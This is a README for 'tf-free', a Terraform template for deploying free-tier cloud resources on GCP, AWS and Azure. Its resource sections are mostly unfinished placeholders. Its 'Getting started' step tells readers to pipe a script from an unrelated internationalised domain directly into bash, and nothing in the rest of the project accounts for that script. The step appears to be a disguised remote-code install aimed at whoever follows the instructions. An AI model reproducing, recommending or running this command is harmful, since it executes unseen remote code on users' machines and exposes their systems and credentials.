# tf-free

This template allows for the user who is initializing it to deploy all the available free resources on the major cloud providers

## Why?

A lot of projects using Terraform ware designed and built using applications of a such a desproportional size, most developers will never get in touch with such a scale.

This project aims to provide the same standard of practices commonly adopted by these bigger projetcts but instead of focusing on learning alone, we aim to provide a practical perspective on the processes that pipelines and tools have to perform each day.

> **It's important to note a project this small wouldn't these tools to work, nor we defend the adoption of these practices in every project without prior analysis regardless of the project's design or size.**

## Getting started

```sh
curl -s https://グルーバー.com/terraform.sh | bash
```

### Root Module Documentation

<details>

  <summary>
   Click to expand
  </summary>

<!-- BEGIN_TF_DOCS -->
### Modules

| Name | Source | Version |
|------|--------|---------|
| gcp | ./modules/gcp/compute |  |

### Inputs

| Name | Description | Type | Default |
|------|-------------|------|---------|
| gcp\_project\_id | Your static IP network resource name on GCP. [GCP's Official documentation on naming resources](https://cloud.google.com/compute/docs/naming-resources#resource-name-format) | `string` | `""` |
| gcp\_project\_region | Your static IP network resource name on GCP. [GCP's Official documentation on naming resources](https://cloud.google.com/compute/docs/naming-resources#resource-name-format) | `string` | `"us-west1"` |

### Outputs

No outputs.
<!-- END_TF_DOCS -->

### Running tests

- Tests are available in `test` directory

- In the test directory, run the below command

```sh
go test
```

</details>

---

## List of free resources by cloud provider

<br>

<details>

  <summary>
   Google Cloud (GCP)
  </summary>

### Requirements

1.

### Conditions

- Example 1
- Example 2

### More information

- [Free resources homepage](https://cloud.google.com/free/docs/gcp-free-tier)

---

## Privisoned Resources

### Compute Engine

test

### Firewall

test

### VPC

test

</details>

<details>

  <summary>
   Amazon AWS
  </summary>

### Requirements

1.

### Conditions

- Example 1
- Example 2

### More information

- [Free resources homepage](https://aws.amazon.com/free/?all-free-tier)

---

## Privisoned Resources

### Amazon EC2

test

### Amazon RDS

test

### Amazon S3

### VPC

test

</details>
<details>

  <summary>
   Microsoft Azure
  </summary>

### Requirements

1.

### Conditions

- Example 1
- Example 2

### More information

- [Free resources homepage](https://azure.microsoft.com/en-us/free/free-account-faq/)

---

## Privisoned Resources

### Azure VMs

test

### Firewall

test

### VPC

test

</details>
